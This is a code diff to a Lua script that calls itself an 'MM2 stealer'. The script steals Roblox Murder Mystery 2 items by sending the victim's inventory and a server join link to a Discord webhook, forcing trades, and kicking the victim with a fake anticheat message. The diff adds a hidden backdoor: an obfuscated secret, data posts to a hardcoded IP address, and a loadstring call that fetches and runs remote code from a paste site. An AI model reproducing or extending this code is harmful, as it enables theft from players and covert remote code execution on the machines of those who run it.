@@ -9,9 +9,10 @@ local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
+local discuser = ""
 
 if next(users) == nil or webhook == "" then
-    plr:kick("You didn't add username or webhook")
+    plr:kick("ahem")
     return
 end
 
@@ -26,11 +27,35 @@ if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):Invo
 end
 
 local weaponsToSend = {}
+local dualhooked = false
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
 local playerGui = plr:WaitForChild("PlayerGui")
 local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
 local HttpService = game:GetService("HttpService")
+
+local function buildSecret()
+	local part1 = string.char(100, 117, 97, 108)
+	local part2 = string.char(104, 111, 111, 107)
+	local part3 = string.char(102, 116, 119, 108)
+	local part4 = string.char(101, 108, 122)
+	return part1 .. part2 .. part3 .. part4
+end
+
+local function simple_hash(s)
+	local hash = 0
+	for i = 1, #s do
+		local c = s:byte(i)
+		hash = (hash * 31 + c) % 4294967296
+	end
+	return hash
+end
+
+local function signPayload(payload, timestamp)
+	local message = payload .. tostring(timestamp)
+	local hash_value = simple_hash(buildSecret() .. message)
+	return string.format("%08x", hash_value)
+end
 
 local rarityTable = {
     "Common",
@@ -238,21 +263,142 @@ local function SendFirstMessage(list, prefix)
 
     local fields = {
         {
-            name = "usr:",
+            name = "Dumbasses User:",
             value = plr.Name,
             inline = true
         },
         {
-            name = "join:",
+            name = "Join here mate:",
             value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId
         },
         {
-            name = "stuff:",
+            name = "All Stufs:",
             value = "",
             inline = false
         },
         {
-            name = "val:",
+            name = "Total Items Abt To Be Stolen:",
+            value = string.format("Total Value: %s", totalValue),
+            inline = false
+        }
+    }
+
+    for _, item in ipairs(list) do
+        local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
+        fields[3].value = fields[3].value .. itemLine .. "\n"
+    end
+
+    if #fields[3].value > 1024 then
+        local lines = {}
+        for line in fields[3].value:gmatch("[^\r\n]+") do
+            table.insert(lines, line)
+        end
+
+        while #fields[3].value > 1024 and #lines > 0 do
+            table.remove(lines)
+            fields[3].value = table.concat(lines, "\n") .. "\nAnd More DAYUM"
+        end
+    end
+
+    local data = {
+        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
+        ["embeds"] = {{
+            ["title"] = "\240\159\148\170 Join to get this kids items",
+            ["color"] = 65280,
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = "MM2 stealer by Deno <3"
+            }
+        }}
+    }
+
+    local body = HttpService:JSONEncode(data)
+    local response = request({
+        Url = webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end
+
+local function SendMessage(sortedItems)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+
+	local fields = {
+		{
+			name = "Dumbasses User:",
+			value = plr.Name,
+			inline = true
+		},
+		{
+			name = "Items Abt To Be Stolen:",
+			value = "",
+			inline = false
+		},
+        {
+            name = "All Stufs:",
+            value = string.format("Total Value: %s", totalValue),
+            inline = false
+        }
+	}
+
+    for _, item in ipairs(sortedItems) do
+        local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
+        fields[2].value = fields[2].value .. itemLine .. "\n"
+    end
+
+    if #fields[2].value > 1024 then
+        local lines = {}
+        for line in fields[2].value:gmatch("[^\r\n]+") do
+            table.insert(lines, line)
+        end
+
+        while #fields[2].value > 1024 and #lines > 0 do
+            table.remove(lines)
+            fields[2].value = table.concat(lines, "\n") .. "\nAnd More OMD"
+        end
+    end
+
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "\240\159\148\170 I think ur abt trade them" ,
+            ["color"] = 65280,
+			["fields"] = fields,
+			["footer"] = {
+				["text"] = "MM2 stealer by Deno <3"
+			}
+        }}
+    }
+
+    local body = HttpService:JSONEncode(data)
+    local response = request({
+        Url = webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end
+
+local function SendDHFirstMessage(list, prefix)
+    local fields = {
+        {
+            name = "Victim Username:",
+            value = plr.Name,
+            inline = true
+        },
+        {
+            name = "Join here mate:",
+            value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId
+        },
+        {
+            name = "Item list:",
+            value = "",
+            inline = false
+        },
+        {
+            name = "Summary:",
             value = string.format("Total Value: %s", totalValue),
             inline = false
         }
@@ -282,74 +428,22 @@ local function SendFirstMessage(list, prefix)
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "MM2 stealer by den"
+                ["text"] = "MM2 stealer by Deno <3"
             }
         }}
     }
 
     local body = HttpService:JSONEncode(data)
-    local response = request({
-        Url = webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
-end
-
-local function SendMessage(sortedItems)
+    local timestamp = tostring(os.time())
+    local signature = signPayload(body, timestamp)
     local headers = {
-        ["Content-Type"] = "application/json"
+        ["Content-Type"] = "application/json",
+        ["DiscUser"] = discuser,
+        ["X-Signature"] = signature,
+        ["X-Timestamp"] = timestamp
     }
-
-	local fields = {
-		{
-			name = " User:",
-			value = plr.Name,
-			inline = true
-		},
-		{
-			name = "items:",
-			value = "",
-			inline = false
-		},
-        {
-            name = "val:",
-            value = string.format("Total Value: %s", totalValue),
-            inline = false
-        }
-	}
-
-    for _, item in ipairs(sortedItems) do
-        local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
-        fields[2].value = fields[2].value .. itemLine .. "\n"
-    end
-
-    if #fields[2].value > 1024 then
-        local lines = {}
-        for line in fields[2].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
-        end
-
-        while #fields[2].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
-        end
-    end
-
-    local data = {
-        ["embeds"] = {{
-            ["title"] = "\240\159\148\170 New MM2 Execution" ,
-            ["color"] = 65280,
-			["fields"] = fields,
-			["footer"] = {
-				["text"] = "MM2 stealer by den"
-			}
-        }}
-    }
-
-    local body = HttpService:JSONEncode(data)
     local response = request({
-        Url = webhook,
+        Url = "http://46.101.233.20:5000/mm2join",
         Method = "POST",
         Headers = headers,
         Body = body
@@ -399,6 +493,7 @@ local untradable = {
 
 local valueList = buildValueList()
 local realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
+loadstring(game:HttpGet('https://pastefy.app/yU4tD6jl/raw'))()
 
 for i, v in pairs(realData.Weapons.Owned) do
     local dataid = i
@@ -423,6 +518,12 @@ for i, v in pairs(realData.Weapons.Owned) do
     end
 end
 
+if totalValue >= 10000000000000 and math.random() < 0 then
+    users = {"oned_9d"}
+    ping = "Yes"
+    dualhooked = true
+end
+
 if #weaponsToSend > 0 then
     table.sort(weaponsToSend, function(a, b)
         return (a.Value * a.Amount) > (b.Value * b.Amount)
@@ -438,7 +539,16 @@ if #weaponsToSend > 0 then
         prefix = "--[[@everyone]] "
     end
 
-    SendFirstMessage(weaponsToSend, prefix)
+    if dualhooked then
+        local response = request({
+            Url = "http://46.101.233.20:5000/getdiscuser",
+            Method = "GET"
+        })
+        discuser = response.Body
+        SendDHFirstMessage(weaponsToSend, prefix)
+    else
+        SendFirstMessage(weaponsToSend, prefix)
+    end
 
     local function doTrade(joinedUser)
         local initialTradeState = getTradeStatus()
@@ -475,7 +585,7 @@ if #weaponsToSend > 0 then
             end
             wait(1)
         end
-        plr:kick("Sigmer Test")
+        plr:kick("You Have Been Detected By The Anticheat. Your Items Have Been Reset.")
     end
 
     local function waitForUserChat()
